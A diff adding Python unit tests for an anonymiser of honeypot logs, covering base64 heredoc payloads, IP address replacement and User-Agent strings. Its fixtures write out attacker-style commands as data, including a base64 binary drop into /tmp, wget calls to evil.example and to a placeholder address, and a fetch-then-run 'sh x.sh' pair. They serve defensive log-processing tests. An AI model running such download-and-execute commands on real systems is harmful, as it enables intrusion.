@@ -199,6 +199,86 @@ def test_a_binary_pasted_through_a_base64_heredoc_does_not_survive() -> None:
     assert all(line not in "\n".join(out) for line in lines)
 
 
+# The second real sample: four lines of that ELF slipped through. Padding in a
+# binary encodes to runs of `A`, so a line has neither lower case nor digits and
+# the mixture test calls it "not encoded". The lines below are invented.
+ZERO_LINES = (
+    "AAAAAEAAOAADAEAAAAAAAAEAAAAFAAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAA",
+    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAIBHYvFVUFgh",
+)
+
+
+def test_zero_padded_base64_lines_in_a_heredoc_do_not_survive() -> None:
+    commands = ("base64 -d > /tmp/hum <<.", BLOB[:64], ZERO_LINES[0], ZERO_LINES[1] + " ", ".")
+    out = Anonymiser().facts(facts(*commands)).commands
+    assert all(line not in "\n".join(out) for line in ZERO_LINES)
+    assert out[0] == commands[0]
+    assert out[-1] == "."  # the delimiter is not payload
+
+
+def test_a_heredoc_line_is_replaced_whatever_it_looks_like() -> None:
+    """The heredoc, not the line's shape, says it is payload: lower case and
+    digits only passes the mixture test as "not encoded"."""
+    line = "mzxw6ytboi2dgnzzgq3tmoruhbtwcytbgq3dsnjugm3tmmbrgi4tcmbq"
+    out = Anonymiser().facts(facts("base64 -d > /tmp/hum <<.", line, line + " ")).commands
+    assert line not in "\n".join(out)
+
+
+def test_a_zero_padded_line_is_caught_even_without_a_heredoc() -> None:
+    assert ZERO_LINES[0] not in Anonymiser().text(f"echo {ZERO_LINES[0]}")
+
+
+def test_a_heredoc_stops_at_its_delimiter() -> None:
+    commands = ("base64 -d > /tmp/x <<EOF", BLOB[:64], "EOF", "linuxshell", "administrator")
+    out = Anonymiser().facts(facts(*commands)).commands
+    assert out[3:] == ("linuxshell", "administrator")
+
+
+def test_a_heredoc_stops_at_the_first_line_that_is_not_base64() -> None:
+    commands = ("base64 -d > /tmp/x <<.", BLOB[:64], "uname -a", "linuxshell")
+    out = Anonymiser().facts(facts(*commands)).commands
+    assert out[2:] == ("uname -a", "linuxshell")
+
+
+def test_words_are_left_alone_when_no_decoding_heredoc_is_open() -> None:
+    """Honeypot logs are full of `linuxshell` and `administrator`: login
+    attempts typed at a prompt. Only a heredoc makes a word payload."""
+    commands = ("linuxshell", "administrator", "cat <<EOF", "linuxshell")
+    assert Anonymiser().facts(facts(*commands)).commands == commands
+
+
+def test_a_here_string_does_not_open_a_heredoc() -> None:
+    commands = ("base64 -d <<< aGVsbG8gd29ybGQ=", "linuxshell")
+    assert Anonymiser().facts(facts(*commands)).commands[1] == "linuxshell"
+
+
+# --- User-Agents -------------------------------------------------------------
+
+UA = (
+    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
+    "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0 (Edition Yx GX)"
+)
+
+
+def test_browser_versions_in_a_user_agent_are_not_taken_for_addresses() -> None:
+    """`Chrome/120.0.0.0` parses as an IPv4 address, and the first export made
+    `Chrome/198.51.100.4` of it: a documentation address, in a place no
+    server ever was."""
+    anonymiser = Anonymiser()
+    assert anonymiser.text(UA) == UA
+    assert anonymiser.addresses_replaced == 0
+
+
+def test_a_real_address_next_to_a_user_agent_is_still_replaced() -> None:
+    out = Anonymiser().text(f"{UA}; wget http://{PUBLIC_A}/x")
+    assert PUBLIC_A not in out
+    assert "Chrome/120.0.0.0" in out
+
+
+def test_a_path_that_looks_like_a_browser_is_not_a_user_agent() -> None:
+    assert PUBLIC_A not in Anonymiser().text(f"wget http://evil.example/Chrome/{PUBLIC_A}")
+
+
 # --- The invariant the evaluation depends on -------------------------------
 
 
@@ -216,6 +296,10 @@ def test_a_binary_pasted_through_a_base64_heredoc_does_not_survive() -> None:
         ("uname -a", "cat /proc/cpuinfo", "nproc"),
         ("enable", "system", "shell", "sh"),
         SPLIT_KEY_SESSION,
+        # The heredoc delivery the rules are known to misread: whatever they
+        # conclude about it must be the same before and after.
+        ("base64 -d > /tmp/hum <<.", BLOB[:64], ZERO_LINES[0], ZERO_LINES[1], "uname -a"),
+        (f'wget --header="{UA}" http://{PUBLIC_A}/x.sh', "sh x.sh"),
     ],
 )
 def test_anonymising_never_changes_what_the_rules_conclude(commands: tuple[str, ...]) -> None:
